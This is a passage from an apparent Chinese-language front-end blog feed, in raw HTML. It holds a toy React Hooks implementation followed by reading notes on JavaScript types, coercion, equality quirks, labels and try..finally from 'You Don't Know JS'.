<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div></li>
</ul>
<h2 id="_7-fc-与-hooks-实现"> 7. FC 与 Hooks 实现</h2>
<ul>
<li>
<p><a href="https://overreacted.io/zh-hans/algebraic-effects-for-the-rest-of-us/" target="_blank" rel="noopener noreferrer">代数效应</a>是函数式编程中的一个概念，用于 “将副作用从函数调用中分离”。</p>
<div><pre><code><span>let</span> workInProgressHook <span>// 当前工作的 Hook</span>
<span>let</span> isMount <span>=</span> <span>true</span> <span>// true 代表首次挂载</span>

<span>// App 组件对应的 fiber</span>
<span>const</span> fiber <span>=</span> <span>{</span>
  <span>memoizedState</span><span>:</span> <span>null</span><span>,</span> <span>// Hooks 链表</span>
  <span>stateNode</span><span>:</span> App<span>,</span> <span>// render</span>
<span>}</span>

<span>// 调度更新</span>
<span>function</span> <span>schedule</span><span>(</span><span>)</span> <span>{</span>
  <span>// 更新前将 workInProgressHook 重置为第一个 Hook</span>
  workInProgressHook <span>=</span> fiber<span>.</span>memoizedState
  <span>// render</span>
  <span>const</span> app <span>=</span> fiber<span>.</span><span>stateNode</span><span>(</span><span>)</span>
  isMount <span>=</span> <span>false</span>
  <span>return</span> app
<span>}</span>

<span>// 更新 Hook（updateNum）</span>
<span>function</span> <span>dispatchAction</span><span>(</span><span>queue<span>,</span> action</span><span>)</span> <span>{</span>
  <span>// 更新队列：环状单向链表（方便取第一个元素和添加元素）</span>
  <span>const</span> update <span>=</span> <span>{</span>
    action<span>,</span> <span>// updateNum 回调</span>
    <span>next</span><span>:</span> <span>null</span><span>,</span> <span>// 下个 update</span>
  <span>}</span>
  <span>// 创建 update 单向环状链表</span>
  <span>// queue.pending 为最后一个添加的元素，queue.pending.next 为第一个添加的元素</span>
  <span>if</span> <span>(</span>queue<span>.</span>pending <span>===</span> <span>null</span><span>)</span> <span>{</span>
    update<span>.</span>next <span>=</span> update
  <span>}</span> <span>else</span> <span>{</span>
    update<span>.</span>next <span>=</span> queue<span>.</span>pending<span>.</span>next
    queue<span>.</span>pending<span>.</span>next <span>=</span> update
  <span>}</span>
  queue<span>.</span>pending <span>=</span> update

  <span>schedule</span><span>(</span><span>)</span>
<span>}</span>

<span>function</span> <span>useState</span><span>(</span><span>initialState</span><span>)</span> <span>{</span>
  <span>let</span> hook

  <span>if</span> <span>(</span>isMount<span>)</span> <span>{</span>
    <span>// 首次挂载</span>
    hook <span>=</span> <span>{</span>
      <span>// 更新队列</span>
      <span>queue</span><span>:</span> <span>{</span>
        <span>pending</span><span>:</span> <span>null</span><span>,</span>
      <span>}</span><span>,</span>
      <span>memoizedState</span><span>:</span> initialState<span>,</span> <span>// Hook 当前状态（num）</span>
      <span>next</span><span>:</span> <span>null</span><span>,</span> <span>// 下个 Hook</span>
    <span>}</span>
    <span>// 创建 Hooks 单向链表</span>
    <span>if</span> <span>(</span><span>!</span>fiber<span>.</span>memoizedState<span>)</span> <span>{</span>
      fiber<span>.</span>memoizedState <span>=</span> hook
    <span>}</span> <span>else</span> <span>{</span>
      workInProgressHook<span>.</span>next <span>=</span> hook
    <span>}</span>
    workInProgressHook <span>=</span> hook
  <span>}</span> <span>else</span> <span>{</span>
    <span>// 更新</span>
    hook <span>=</span> workInProgressHook
    workInProgressHook <span>=</span> workInProgressHook<span>.</span>next <span>// 移动到下一个 Hook</span>
  <span>}</span>

  <span>let</span> baseState <span>=</span> hook<span>.</span>memoizedState <span>// 保存更新前状态</span>
  <span>// 判断当前 Hook 更新队列是否为空</span>
  <span>if</span> <span>(</span>hook<span>.</span>queue<span>.</span>pending<span>)</span> <span>{</span>
    <span>let</span> firstUpdate <span>=</span> hook<span>.</span>queue<span>.</span>pending<span>.</span>next

    <span>// 执行更新队列函数，获取最后的 Hook 状态</span>
    <span>do</span> <span>{</span>
      <span>const</span> action <span>=</span> firstUpdate<span>.</span>action
      baseState <span>=</span> <span>action</span><span>(</span>baseState<span>)</span>
      firstUpdate <span>=</span> firstUpdate<span>.</span>next
    <span>}</span> <span>while</span> <span>(</span>firstUpdate <span>!==</span> hook<span>.</span>queue<span>.</span>pending<span>)</span>

    <span>// 清空更新队列</span>
    hook<span>.</span>queue<span>.</span>pending <span>=</span> <span>null</span>
  <span>}</span>
  <span>// 更新 Hook 当前状态</span>
  hook<span>.</span>memoizedState <span>=</span> baseState

  <span>return</span> <span>[</span>baseState<span>,</span> <span>dispatchAction</span><span>.</span><span>bind</span><span>(</span><span>null</span><span>,</span> hook<span>.</span>queue<span>)</span><span>]</span>
<span>}</span>

<span>function</span> <span>App</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>[</span>num<span>,</span> updateNum<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>0</span><span>)</span>

  console<span>.</span><span>log</span><span>(</span><span><span>`</span><span><span>${</span>isMount <span>?</span> <span>'mount'</span> <span>:</span> <span>'update'</span><span>}</span></span><span> num: </span><span>`</span></span><span>,</span> num<span>)</span>

  <span>return</span> <span>{</span>
    <span>click</span><span>(</span><span>)</span> <span>{</span>
      <span>updateNum</span><span>(</span><span>num</span> <span>=></span> num <span>+</span> <span>1</span><span>)</span>
    <span>}</span><span>,</span>
  <span>}</span>
<span>}</span>

window<span>.</span>app <span>=</span> <span>schedule</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br></div></div></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>你不知道的 JS（中）</title>
      <link>https://www.matrixtheone.ga/web/note/books/You-Don%E2%80%99t-Know-JS-Vol2/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/You-Don%E2%80%99t-Know-JS-Vol2/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">你不知道的 JS（中）</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-类型"> 1. 类型</h2>
<ul>
<li>
<p>很多开发人员将 undefined 和 undeclared 混为一谈，但在 JavaScript 中它们是两码事。undefined 是值的一种，undeclared 则表示变量还没有被声明过。</p>
</li>
<li>
<p>遗憾的是，JavaScript 却将它们混为一谈，在我们试图访问 “undeclared” 变量时这样报错: ReferenceError: a is not defined，并且 typeof 对 undefined 和 undeclared 变量都返回 “undefined”。</p>
</li>
<li>
<p>然而，通过 typeof 的安全防范机制（阻止报错）来检查 undeclared 变量，有时是个不错的办法。</p>
</li>
</ul>
<h2 id="_2-数字有效语法"> 2. 数字有效语法</h2>
<div><pre><code><span>(</span><span>7</span><span>)</span><span>.</span><span>toFixed</span><span>(</span><span>2</span><span>)</span>
<span>7.0</span><span>.</span><span>toFixed</span><span>(</span><span>2</span><span>)</span>
<span>7.</span><span>.</span><span>toFixed</span><span>(</span><span>2</span><span>)</span>
<span>7</span> <span>.</span><span>toFixed</span><span>(</span><span>2</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_3-零值"> 3. 零值</h2>
<div><pre><code><span>var</span> a <span>=</span> <span>0</span> <span>/</span> <span>-</span><span>3</span>

a<span>.</span><span>toString</span><span>(</span><span>)</span> <span>// '0'</span>
a <span>+</span> <span>''</span> <span>// '0'</span>
<span>String</span><span>(</span>a<span>)</span> <span>// '0'</span>

<span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>-</span><span>0</span><span>)</span> <span>// '0'</span>
<span>JSON</span><span>.</span><span>parse</span><span>(</span><span>'-0'</span><span>)</span> <span>// -0</span>

<span>+</span><span>'-0'</span> <span>// -0</span>
<span>Number</span><span>(</span><span>'-0'</span><span>)</span> <span>// -0</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><h2 id="_4-特殊等式"> 4. 特殊等式</h2>
<ul>
<li>能使用 == 和 === 时就尽量不要使用 Object.is(..)，因为前者效率更高、更为通用。Object.is(..)主要用来处理那些特殊的相等比较（-0 与 NaN）。</li>
</ul>
<h2 id="_5-array"> 5. Array</h2>
<ul>
<li>
<p>Array 与 new Array 效果一样，不带时它会被自动补上。</p>
</li>
<li>
<p>永远不要创建和使用空单元数组。</p>
<blockquote>
<p>空单元数组（无可迭代元素）</p>
</blockquote>
<div><pre><code><span>Array</span><span>(</span><span>7</span><span>)</span>

<span>var</span> a <span>=</span> <span>[</span><span>]</span>
a<span>.</span>length <span>=</span> <span>7</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><blockquote>
<p>快速创建指定长度数组</p>
</blockquote>
<div><pre><code><span>Array</span><span>.</span><span>apply</span><span>(</span><span>null</span><span>,</span> <span>{</span> <span>length</span><span>:</span> <span>7</span> <span>}</span><span>)</span>

<span>Array</span><span>(</span><span>7</span><span>)</span><span>.</span><span>fill</span><span>(</span><span>7</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
</ul>
<h2 id="_6-假值"> 6. 假值</h2>
<ul>
<li>
<p>我们经常通过将 document.all 强制类型转换为布尔值（比如在 if 语句中）来判断浏览器是否是老版本的 IE。IE 自诞生之日起就始终遵循浏览器标准，较其他浏览器更为有力地推动了 Web 的发展。</p>
</li>
<li>
<p>以下为假值。</p>
<blockquote>
<ul>
<li>undefined</li>
<li>null</li>
<li>+0、-0、0n、-0n 和 NaN</li>
<li>''</li>
<li>浏览器中的 document.all 等假值对象</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_7-奇特的-运算符"> 7. 奇特的 ~ 运算符</h2>
<ul>
<li>
<p>字位反转是个很晦涩的主题，JavaScript 开发人员一般很少需要关心到字位级别。</p>
</li>
<li>
<p>对 ~ 还可以有另外一种诠释，源自早期的计算机科学和离散数学：~ 返回 2 的补码。这样一来问题就清楚多了!</p>
</li>
<li>
<p>~x 大致等同于 -(x+1)。很奇怪，但相对更容易说明问题。</p>
</li>
</ul>
<div><pre><code><span>var</span> a <span>=</span> <span>'Hello World'</span>

<span>~</span>a<span>.</span><span>indexOf</span><span>(</span><span>'lo'</span><span>)</span> <span>// -(3 + 1) 真值</span>
<span>~</span>a<span>.</span><span>indexOf</span><span>(</span><span>'ol'</span><span>)</span> <span>// -(-1 + 1) 假值</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_8-字位截除"> 8. 字位截除</h2>
<ul>
<li>
<p>它只适用于 32 位数字，更重要的是它对负数的处理与 Math.floor(..)不同。</p>
</li>
<li>
<p>~~x 能将值截除为一个 32 位整数，x | 0 也可以。~~x 优先级更高，x | 0 更简洁。</p>
</li>
</ul>
<div><pre><code>Math<span>.</span><span>floor</span><span>(</span><span>43.96</span><span>)</span> <span>// 43</span>
Math<span>.</span><span>floor</span><span>(</span><span>-</span><span>43.96</span><span>)</span> <span>// -44</span>

<span>~</span><span>~</span><span>43.96</span> <span>// 43</span>
<span>~</span><span>~</span><span>-</span><span>43.96</span> <span>// -43</span>

<span>43.96</span> <span>|</span> <span>0</span> <span>// 43</span>
<span>-</span><span>43.96</span> <span>|</span> <span>0</span> <span>// -43</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_9-显示解析数字字符串"> 9. 显示解析数字字符串</h2>
<ul>
<li>
<p>parseInt(1/0, 19) 实际上是 parseInt(&quot;Infinity&quot;, 19)。 第一个字符是 &quot;I&quot;，以 19 为基数时值为 18。第二个字符 &quot;n&quot; 不是一个有效的数字字符，解析到此为止，和 &quot;42px&quot; 中的 &quot;p&quot; 一样。</p>
</li>
<li>
<p>最后的结果是 18，而非 Infinity 或者报错。所以理解其中的工作原理对于我们学习 JavaScript 是非常重要的。</p>
</li>
<li>
<p>此外还有一些看起来奇怪但实际上解释得通的例子。</p>
</li>
</ul>
<div><pre><code><span>parseInt</span><span>(</span><span>1</span> <span>/</span> <span>0</span><span>,</span> <span>19</span><span>)</span> <span>// 18</span>

<span>parseInt</span><span>(</span><span>0.000008</span><span>)</span> <span>// 0 （'0'来自于'0.000008'）</span>
<span>parseInt</span><span>(</span><span>0.0000008</span><span>)</span> <span>// 8 （'8'来自于'8e-7'）</span>
<span>parseInt</span><span>(</span><span>false</span><span>,</span> <span>16</span><span>)</span> <span>// 250 （'fa'来自于'false'）</span>
<span>parseInt</span><span>(</span>parseInt<span>,</span> <span>16</span><span>)</span> <span>// 15 （'f'来自于'function..'）</span>

<span>parseInt</span><span>(</span><span>'0x10'</span><span>)</span> <span>// 16</span>
<span>parseInt</span><span>(</span><span>'103'</span><span>,</span> <span>2</span><span>)</span> <span>// 2</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><h2 id="_10-字符串和数字之间的隐式强制类型转换"> 10. 字符串和数字之间的隐式强制类型转换</h2>
<div><pre><code><span>[</span><span>]</span> <span>+</span> <span>{</span><span>}</span> <span>// '[object Object]'，相当于：'' + '[object Object]'</span>

<span>{</span><span>}</span> <span>+</span> <span>[</span><span>]</span> <span>// 0，第一个 {..} 会被认为是区块语句而不是对象字面量，相当于：+[]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_11-相等比较"> 11. 相等比较</h2>
<ul>
<li>布尔值会先转换为数字再比较。</li>
</ul>
<div><pre><code><span>7</span> <span>==</span> <span>true</span> <span>// false</span>
<span>7</span> <span>==</span> <span>false</span> <span>// false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><ul>
<li>null 与 undefined '==' 比较相等，与其他假值都不相等。</li>
</ul>
<div><pre><code><span>null</span> <span>==</span> <span>undefined</span> <span>// true</span>
<span>null</span> <span>==</span> <span>''</span> <span>||</span> <span>null</span> <span>==</span> <span>0</span> <span>||</span> <span>null</span> <span>==</span> <span>false</span> <span>// false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><ul>
<li>
<p>因为没有对应的封装对象，所以 null 和 undefined 不能够被封装（boxed），Object(null) 和 Object(undefined) 均返回一个常规对象。</p>
</li>
<li>
<p>NaN 能够被封装为数字封装对象，但拆封之后 NaN == NaN 返回 false，因为 NaN 不等于 NaN。</p>
</li>
</ul>
<div><pre><code><span>'abc'</span> <span>==</span> <span>Object</span><span>(</span><span>'abc'</span><span>)</span> <span>// true，拆封调用toString方法</span>
<span>null</span> <span>==</span> <span>Object</span><span>(</span><span>null</span><span>)</span> <span>// false，不能够被封装</span>
<span>undefined</span> <span>==</span> <span>Object</span><span>(</span><span>undefined</span><span>)</span> <span>// false，不能够被封装</span>
<span>NaN</span> <span>==</span> <span>Object</span><span>(</span><span>NaN</span><span>)</span> <span>// false，与自身不等</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><ul>
<li>极端情况</li>
</ul>
<div><pre><code><span>[</span><span>]</span> <span>==</span> <span>!</span><span>[</span><span>]</span> <span>// true，转换过程：[] -> '' -> 0，![] -> false -> 0</span>

<span>''</span> <span>==</span> <span>[</span><span>null</span><span>]</span> <span>// true</span>

<span>0</span> <span>==</span> <span>'\n'</span> <span>||</span> <span>0</span> <span>==</span> <span>'  '</span> <span>// true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li>
<p>ES5 规范 11.8.5 节定义了 “抽象关系比较”（abstract relational comparison），分为两个部分：比较双方都是字符串（后半部分）和其他情况（前半部分）。</p>
</li>
<li>
<p>该算法仅针对 a &lt; b，a = '' &gt; b 会被处理为 b &lt; a。</p>
</li>
</ul>
<div><pre><code><span>[</span><span>42</span><span>]</span> <span>&lt;</span> <span>[</span><span>'43'</span><span>]</span> <span>// true，转为数字再比较</span>

<span>[</span><span>'42'</span><span>]</span> <span>&lt;</span> <span>[</span><span>'043'</span><span>]</span> <span>// false，都为字符串，比较字母顺序</span>

<span>{</span><span>}</span> <span>&lt;</span> <span>{</span><span>}</span> <span>// false，字符串 '[object Object]' 比较</span>
<span>{</span><span>}</span> <span>==</span> <span>{</span><span>}</span> <span>// false，内存地址比较</span>
<span>{</span><span>}</span> <span>></span> <span>{</span><span>}</span> <span>// false，字符串 '[object Object]' 比较</span>

<span>{</span><span>}</span> <span>&lt;=</span> <span>{</span><span>}</span> <span>// true，根据规则为 {} > {} 比较结果的反转</span>
<span>{</span><span>}</span> <span>>=</span> <span>{</span><span>}</span> <span>// true，根据规则为 {} &lt; {} 比较结果的反转</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><img :src="$withBase('/images/You-Don’t-Know-JS/相等比较.png')" loading="lazy">
<h2 id="_12-语句的结果值"> 12. 语句的结果值</h2>
<ul>
<li>
<p>从技术角度来解释要更复杂一些。ES5 规范 12.2 节中的变量声明（VariableDeclaration）算法实际上有一个返回值（是一个包含所声明变量名称的字符串，很奇特吧？），但是这个值被变量语句（VariableStatement）算法屏蔽掉了（for..in 循环除外），最后返回结果为空（undefined）。</p>
</li>
<li>
<p>如果你用开发控制台（或者 JavaScript REPL——read/evaluate/print/loop 工具）调试过代码，应该会看到很多语句的返回值显示为 undefined，只是你可能从未探究过其中的原因，其实控制台中显示的就是语句的结果值。</p>
</li>
</ul>
<div><pre><code><span>var</span> b
<span>if</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
  b <span>=</span> <span>4</span> <span>+</span> <span>38</span>
<span>}</span>
<span>// 控制台打印42</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li>可以使用万恶的 eval(..) （又读作“evil”）来获得结果值。</li>
</ul>
<div><pre><code><span>var</span> a<span>,</span> b
a <span>=</span> <span>eval</span><span>(</span><span>'if (true) { b = 4 + 38; }'</span><span>)</span>
a <span>// 42</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_13-表达式的副作用"> 13. 表达式的副作用</h2>
<ul>
<li>
<p>++a++ 会产生 ReferenceError 错误，因为运算符需要将产生的副作用赋值给一个变量。以 ++a++ 为例，它首先执行 a++ （根据运算符优先级），返回 42，然后执行 ++42，这时会产生 ReferenceError 错误，因为 ++ 无法直接在 42 这样的值上产生副作用。</p>
</li>
<li>
<p>a = 42 中的 = 运算符看起来没有副作用，实际上它的结果值是 42，它的副作用是将 42 赋值给 a。</p>
</li>
</ul>
<div><pre><code><span>var</span> a
a <span>=</span> <span>42</span> <span>// 42</span>
a <span>// 42</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><ul>
<li>链式赋值常常被误用，例如 var a = b = 42，看似和前面的例子差不多，实则不然。如果变量 b 没有在作用域中象 var b 这样声明过，则 var a = b =42 不会对变量 b 进行声明。在严格模式中这样会产生错误，或者会无意中创建一个全局变量。</li>
</ul>
<h2 id="_14-上下文规则"> 14. 上下文规则</h2>
<ul>
<li>
<p>标签语句（非 goto）。</p>
<blockquote>
<p>contine foo 并不是指 “跳转到标签 foo 所在位置继续执行”，而是 “执行 foo 循环的下一轮循环”。</p>
</blockquote>
<div><pre><code><span>// 标签为foo的循环</span>
<span>foo</span><span>:</span> <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>4</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>for</span> <span>(</span><span>var</span> j <span>=</span> <span>0</span><span>;</span> j <span>&lt;</span> <span>4</span><span>;</span> j<span>++</span><span>)</span> <span>{</span>
    <span>// 如果j和i相等，继续外层循环</span>
    <span>if</span> <span>(</span>j <span>==</span> i<span>)</span> <span>{</span>
      <span>// 跳转到foo的下一个循环</span>
      <span>continue</span> foo
    <span>}</span>
    <span>// 跳过奇数结果</span>
    <span>if</span> <span>(</span><span>(</span>j <span>*</span> i<span>)</span> <span>%</span> <span>2</span> <span>==</span> <span>1</span><span>)</span> <span>{</span>
      <span>// 继续内层循环（没有标签的）</span>
      <span>continue</span>
    <span>}</span>
    console<span>.</span><span>log</span><span>(</span>i<span>,</span> j<span>)</span>
  <span>}</span>
<span>}</span>
<span>// 1 0</span>
<span>// 2 0</span>
<span>// 2 1</span>
<span>// 3 0</span>
<span>// 3 2</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><blockquote>
<p>break foo 不是指 “跳转到标签 foo 所在位置继续执行”，而是 “跳出标签 foo 所在的循环 / 代码块，继续执行后面的代码”。</p>
</blockquote>
<div><pre><code><span>// 标签为foo的循环</span>
<span>foo</span><span>:</span> <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>4</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>for</span> <span>(</span><span>var</span> j <span>=</span> <span>0</span><span>;</span> j <span>&lt;</span> <span>4</span><span>;</span> j<span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>i <span>*</span> j <span>>=</span> <span>3</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>'stopping!'</span><span>,</span> i<span>,</span> j<span>)</span>
      <span>break</span> foo
    <span>}</span>
    console<span>.</span><span>log</span><span>(</span>i<span>,</span> j<span>)</span>
  <span>}</span>
<span>}</span>
<span>// 0 0</span>
<span>// 0 1</span>
<span>// 0 2</span>
<span>// 0 3</span>
<span>// 1 0</span>
<span>// 1 1</span>
<span>// 1 2</span>
<span>// 停止！ 1 3</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div></li>
<li>
<p>JSON 被普遍认为是 JavaScript 语言的一个真子集， {&quot;a&quot;:42} 这样的 JSON 字符串会被当作合法的 JavaScript 代码（请注意 JSON 属性名必须使用双引号！）。其实不是！如果在控制台中输入 {&quot;a&quot;:42} 会报错。因为标签不允许使用双引号，所以 &quot;a&quot; 并不是一个合法的标签，因此后面不能带 : 。</p>
<blockquote>
<ul>
<li>JSON 的确是 JavaScript 语法的一个子集，但是 JSON 本身并不是合法的 JavaScript 语法。</li>
<li>这里存在一个十分常见的误区，即如果通过 <code>&lt;script src=..&gt;</code> 标签加载 JavaScript 文件，其中只包含 JSON 数据（比如某个 API 返回的结果），那它就会被当作合法的 JavaScript 代码来解析，只不过其内容无法被程序代码访问到。JSON-P（将 JSON 数据封装为函数调用，比如 foo({&quot;a&quot;:42}) ）通过将 JSON 数据传递给函数来实现对其的访问。</li>
<li>{&quot;a&quot;:42} 作为 JSON 值没有任何问题，但是在作为代码执行时会产生错误，因为它会被当作一个带有非法标签的语句块来执行。foo({&quot;a&quot;:42}) 就没有这个问题，因为 {&quot;a&quot;:42} 在这里是一个传递给 foo(..) 的对象常量。所以准确地说，JSON-P 能将 JSON 转换为合法的 JavaScript 语法。</li>
</ul>
</blockquote>
</li>
<li>
<p>else if 和可选代码块。</p>
<blockquote>
<p>很多人误以为 JavaScript 中有 else if，因为我们可以这样来写代码。</p>
</blockquote>
<div><pre><code><span>if</span> <span>(</span>a<span>)</span> <span>{</span>
  <span>// ..</span>
<span>}</span> <span>else</span> <span>if</span> <span>(</span>b<span>)</span> <span>{</span>
  <span>// ..</span>
<span>}</span> <span>else</span> <span>{</span>
  <span>// ..</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><blockquote>
<ul>
<li>事实上 JavaScript 没有 else if，但 if 和 else 只包含单条语句的时候可以省略代码块的 { }。</li>
<li>我们经常用到的 else if 实际上是这样的。</li>
</ul>
</blockquote>
<div><pre><code><span>if</span> <span>(</span>a<span>)</span> <span>{</span>
  <span>// ..</span>
<span>}</span> <span>else</span> <span>{</span>
  <span>if</span> <span>(</span>b<span>)</span> <span>{</span>
    <span>// ..</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>// ..</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><blockquote>
<p>else if 极为常见，能省掉一层代码缩进，所以很受青睐。但这只是我们自己发明的用法，切勿想当然地认为这些都属于 JavaScript 语法的范畴。</p>
</blockquote>
</li>
</ul>
<h2 id="_15-try-finally"> 15. try..finally</h2>
<ul>
<li>这里 return 42 先执行，并将 foo() 函数的返回值设置为 42。然后 try 执行完毕，接着执行 finally。最后 foo() 函数执行完毕，console.log(..) 显示返回值。</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  <span>try</span> <span>{</span>
    <span>return</span> <span>42</span>
  <span>}</span> <span>finally</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'Hello'</span><span>)</span>
  <span>}</span>
  console<span>.</span><span>log</span><span>(</span><span>'never runs'</span><span>)</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span><span>foo</span><span>(</span><span>)</span><span>)</span>
<span>// Hello</span>
<span>// 42</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><ul>
<li>finally 中的 return 会覆盖 try 和 catch 中 return 的返回值。</li>
</ul>
<h2 id="_16-混合环境-javascript"> 16. 混合环境 JavaScript</h2>
<ul>
<li>由于浏览器演进的历史遗留问题，在创建带有 id 属性的 DOM 元素时也会创建同名的全局变量。</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>foo<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre>
<div><span>1</span><br></div></div><div><pre><code><span>if</span> <span>(</span><span>typeof</span> foo <span>==</span> <span>'undefined'</span><span>)</span> <span>{</span>
  foo <span>=</span> <span>42</span> <span>// 永远也不会运行</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span>foo<span>)</span> <span>// HTML元素</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_17-异步控制台"> 17. 异步控制台</h2>
<ul>
<li>
<p>并没有什么规范或一组需求指定 console.* 方法族如何工作 —— 它们并不是 JavaScript 正式的一部分，而是由宿主环境添加到 JavaScript 中的。</p>
</li>
<li>
<p>因此，不同的浏览器和 JavaScript 环境可以按照自己的意愿来实现，有时候这会引起混淆。尤其要提出的是，在某些条件下，某些浏览器的 console.log(..) 并不会把传入的内容立即输出。出现这种情况的主要原因是，在许多程序（不只是 JavaScript）中，I/O 是非常低速的阻塞部分。所以，（从页面 /UI 的角度来说）浏览器在后台异步处理控制台 I/O 能够提高性能，这时用户甚至可能根本意识不到其发生。</p>
</li>
</ul>
<div><pre><code><span>var</span> a <span>=</span> <span>{</span>
  <span>index</span><span>:</span> <span>1</span><span>,</span>
<span>}</span>
<span>// 然后</span>
